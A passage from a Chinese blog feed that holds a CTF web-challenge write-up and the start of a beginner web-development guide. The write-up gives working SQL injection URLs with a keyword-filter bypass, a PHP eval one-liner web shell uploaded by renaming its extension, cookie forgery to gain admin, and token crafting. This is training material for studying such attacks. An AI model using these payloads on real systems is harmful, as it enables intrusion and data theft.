ord&lt;&gt;er by 4</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/PzeNLR.md.png" alt="PzeNLR.md.png"></p><p>没出现结果，所以接下来继续爆字段,4不对就二分法换2，然后发现还是没结果，换3有了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/Pzeae1.md.png" alt="Pzeae1.md.png"></p><p>然后输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,2,3 from info</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/PzeWwt.png" alt="PzeWwt.png"></p><p>说明第二个字段可以显示，那么接下来就是爆数据库名，表名，列名:</p><p>①爆数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3 from info</span><br></pre></td></tr></table></figure><p>②爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br></pre></td></tr></table></figure><p>③爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_name=&apos;sqli&apos;</span><br></pre></td></tr></table></figure><p>发现疑似存在flag的列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from sqli.info</span><br></pre></td></tr></table></figure><p>flag就出来了。</p><h4 id="（3）Do-you-know-upload"><a href="#（3）Do-you-know-upload" class="headerlink" title="（3）Do you know upload"></a>（3）Do you know upload</h4><p>==hint：加油吧，少年。==</p><p>创建链接，点开</p><p><img src="https://s1.ax1x.com/2018/09/03/Pzs8hV.png" alt="Pzs8hV.png"></p><p>很明显文件上传，试着上传已经写好的PHP一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后改为jpg格式上传抓包，并改为php后缀就可以成功上传。</p><p><img src="https://s1.ax1x.com/2018/09/03/PzsBA1.png" alt="PzsBA1.png"></p><p>因为我之前已经成功上传过了1.php文件，显示已存在，如果是第一次上传就会显示路径：upload/1.php</p><p><img src="https://s1.ax1x.com/2018/09/03/PzsLuQ.png" alt="PzsLuQ.png"></p><p>然后就是菜刀连接，打开</p><p><img src="https://s1.ax1x.com/2018/09/03/PzypCV.md.png" alt="PzypCV.md.png"></p><p>发现config.php和ctf.sql，flag应该存在数据库中，点开config.php可以看到数据库的信息</p><p><img src="https://i.loli.net/2018/09/03/5b8cfa6a6d4c5.png" alt=""></p><p>然后用菜刀编写shell连接到数据库查看flag。</p><h4 id="（4）broken"><a href="#（4）broken" class="headerlink" title="（4）broken"></a>（4）broken</h4><p>==hint：you got a file,but…==</p><p>点开链接，发现file是个超链接，点进去</p><p><img src="https://i.loli.net/2018/09/03/5b8d2f6f6b077.png" alt=""></p><p>一看jother编码，放进浏览器控制台，发现末尾少了一个]，加上后出现错误</p><p><img src="https://i.loli.net/2018/09/03/5b8d3098dff26.png" alt=""></p><p>于是删除最后面的()，再次输入得到[Array(1)]，打开就可以看到flag了。</p><h4 id="（5）who-are-you"><a href="#（5）who-are-you" class="headerlink" title="（5）who are you?"></a>（5）who are you?</h4><p>==hint：我是谁，我在哪，我要做什么？==</p><p>点开链接进去，显示</p><p><img src="https://i.loli.net/2018/09/03/5b8d386d864b0.png" alt=""></p><p>然后抓包发现cookie参数有问题</p><p><img src="https://i.loli.net/2018/09/03/5b8d38a85a2fb.png" alt=""></p><p>猜测是base64编码，拿去解码得</p><p><img src="https://i.loli.net/2018/09/03/5b8d390189eb1.png" alt=""></p><p>是Rot13，运行脚本解码得到guest，尝试将guest换成admin用脚本进行Rot13加密得到Zjo1OiJucXp2YSI7，再重新放入cookie中</p><p><img src="https://i.loli.net/2018/09/03/5b8d39de575a8.png" alt=""></p><p>可以看到已经成功登陆并且说可以上传，旁边有一条注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[&apos;filename&apos;]; $data = $_POST[&apos;data&apos;]; --&gt;</span><br></pre></td></tr></table></figure><p>所以将请求包改成POST形式，然后输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=2.php&amp;data[]=&lt;?php eval($_POST[&apos;a&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>再次提交</p><p><img src="https://i.loli.net/2018/09/03/5b8d39cbbb1ba.png" alt=""></p><p>找到路径，输入进去看看就可以得到flag。</p><h4 id="（6）Login"><a href="#（6）Login" class="headerlink" title="（6）Login"></a>（6）Login</h4><p>==hint：加油，我看好你==</p><p>点开链接，是一个登录界面</p><p><img src="https://i.loli.net/2018/09/04/5b8df38fd1ab5.png" alt=""></p><p>做web题习惯性的点开页面源代码看，发现一行注释，虽然在页面下面</p><p><img src="https://i.loli.net/2018/09/04/5b8df3ede8efd.png" alt=""></p><p>猜测是账号密码，输入登录发现成功登录，然而登录了并没有什么东西，抓包看看</p><p><img src="https://i.loli.net/2018/09/04/5b8df4aa946e2.png" alt=""></p><p>发现member.php这页刷新返回包中有一个show参数，猜测可以show source，所以改包，加上一个show参数并设为1</p><p><img src="https://i.loli.net/2018/09/04/5b8df5a930d62.png" alt=""></p><p>发现真的出现了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">$db = <span class="keyword">new</span> db();</span><br><span class="line">$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要的就是这段,编写代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="string">'ichunqiu'</span>);</span><br><span class="line">$a=base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行得到token</p><p><img src="https://i.loli.net/2018/09/04/5b8df71053d38.png" alt=""></p><p>然后放到cookie中提交就可以得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="CTF训练" scheme="http://yoursite.com/categories/CTF%E8%AE%AD%E7%BB%83/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>WEB开发快速入门（一）</title>
    <link href="http://yoursite.com/2018/09/16/web%E5%BC%80%E5%8F%91%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
    <id>http://yoursite.com/2018/09/16/web开发快速入门(一)/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-10-08T11:41:36.718Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82413891</span></span><br></pre></td></tr></table></figure><h4 id="1、HTTP状态码"><a href="#1、HTTP状态码" class="headerlink" title="1、HTTP状态码"></a>1、HTTP状态码</h4><p>对网站管理工作者来说有个词不陌生，HTTP状态码，它是用以表示网页服务器HTTP响应状态的3位数字代码。状态码的第一个数字代表了响应的五种状态之一。</p><p>　　==1XX系列==：指定客户端应相应的某些动作，代表请求已被接受，需要继续处理。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应。</p><p>　　==2XX系列==：代表请求已成功被服务器接收、理解、并接受。这系列中最常见的有200、201状态码。<br>　　200状态码：表示请求已成功，请求所希望的响应头或数据体将随此响应返回<br>　　201状态码：表示请求成功并且服务器创建了新的资源，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’</p><p>　　202状态码：服务器已接受请求，但尚未处理</p><p>　　==3XX系列==：代表需要客户端采取进一步的操作才能完成请求，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。这系列中最常见的有301、302状态码。<br>　　301状态码：被请求的资源已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</p><p>　　302状态码：请求的资源临时从不同的URI响应请求，但请求者应继续使用原有位置来进行以后的请求</p><p>​        304自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。</p><p>　　==4XX系列==：表示请求错误。代表了客户端看起来可能发生了错误，妨碍了服务器的处理。常见有：401、404状态码。<br>　　401状态码：请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。<br>　　403状态码：服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。</p><p>　　404状态码：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p><p>　　==5xx系列==：代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。常见有500、503状态码。<br>　　500状态码：服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。<br>　　503状态码：由于临时的服务器维护或者过载，服务器当前无法处理请求。通常，这个是暂时状态，一段时间会恢复<br>　　了解基本SEO状态码，是SEO优化人员必备知识。HTTP状态码是服务器和客户端之间交流信息的语言。通过查看网站日志的HTTP码，我们可以清楚查看搜索引擎在网站的爬取情况。</p><h4 id="2、前后端分离"><a href="#2、前后端分离" class="headerlink" title="2、前后端分离"></a>2、前后端分离</h4><p>==前端==：整个页面显示以及页面的交互逻辑。用ajax和node作为交互。其中node作为中间层。</p><p>==后端==：提供api接口，利用redis保存session，与数据库交互。</p><p>==流程==：</p><p>​    （1）客户端（浏览器）向node请求页面交互。</p><p>​    （2）node向后端（这里用java）转发请求，java在发送请求到数据库。</p><p>​    （3）java返回结果给node，node返回页面，提供数据。</p><p>==前后端分离前端==：</p><p>​    前端可以不依赖后端，前端自己起一个服务，如果前端页面处理好，后端的API还没有提供，那么，前端可以用mock模拟数据。</p><p>这里出现一个问题，如果没有服务，单页面是不可以ajax请求数据，会出现跨域的问题。要么浏览器做跨域。所以这里用到node。</p><p>我们利用node的express开启一个本地服务器，利用node的 http-proxy-middleware 插件将客户端发送给node的请求发给真正后服务器。</p><h4 id="3、Node"><a href="#3、Node" class="headerlink" title="3、Node"></a>3、Node</h4><p>Node主要是为了分层开发，前端不需要知道后端是怎么提供数据，怎么操作。后端也不需要知道node是怎么操作，前端是怎么部署。前端可以利用node自己作处理。</p><p>Node本身有着异步,非阻塞I／o。在处理并发量比较大的数据请求上有很大的优势。</p><h4 id="4、基础环境配置"><a href="#4、基础环境配置" class="headerlink" title="4、基础环境配置"></a>4、基础环境配置</h4><p>（1）==JDK==</p><p>JDK(Java Development Kit) 是 Java 语言的软件开发工具包(SDK)。<br>SE(JavaSE)，standard edition，标准版，是我们通常用的一个版本，从JDK 5.0开始，改名为Java SE。<br>EE(JavaEE)，enterprise edition，企业版，使用这种JDK开发J2EE应用程序，从JDK 5.0开始，改名为Java EE。从2018年2月26日开始，J2EE改名为Jakarta EE [1-2]  。<br>ME(J2ME)，micro edition，主要用于移动设备、嵌入式设备上的java应用程序，从JDK 5.0开始，改名为Java ME。<br>没有JDK的话，无法编译Java程序（指java源码.java文件），如果想只运行Java程序（指class或jar或其它归档文件），要确保已安装相应的JRE。</p><p>（2）==Node==</p><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。 </p><p>（3）==Yarn==</p><p>Yarn是快速、可靠、安全的依赖管理工具。<br>快速：Yarn 缓存了每个下载过的包，所以再次使用时无需重复下载。 同时利用并行下载以最大化资源利用率，因此安装速度更快。<br>可靠：使用详细、简洁的锁文件格式和明确的安装算法，Yarn 能够保证在不同系统上无差异的工作<br>安全：在执行代码之前，Yarn 会通过算法校验每个安装包的完整性。</p><p>可以在命令行输入下面的命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br><span class="line">npm install -g yarn</span><br><span class="line">yarn config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>（4）==IDEA==</p><p>IDEA 全称IntelliJ IDEA，是用于java语言开发的集成环境（也可用于其他语言），IntelliJ在业界被公认为最好的java开发工具之一，尤其在智能代码助手、代码自动提示、重构、J2EE支持、Ant、JUnit、CVS整合、代码审查、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品。</p><p>（5）==Postman==</p><p>Postman 是一个很强大的 API调试、Http请求的工具，允许用户发送任何类型的 HTTP 请求，例如 GET，POST，HEAD，PUT、DELETE等，并且可以允许任意的参数和 Headers。</p><p>（6）==Xampp==</p><p>XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。</p><p>XAMPP 的确非常容易安装和使用：只需下载，解压缩，启动即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Web开发" scheme="http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
</feed>
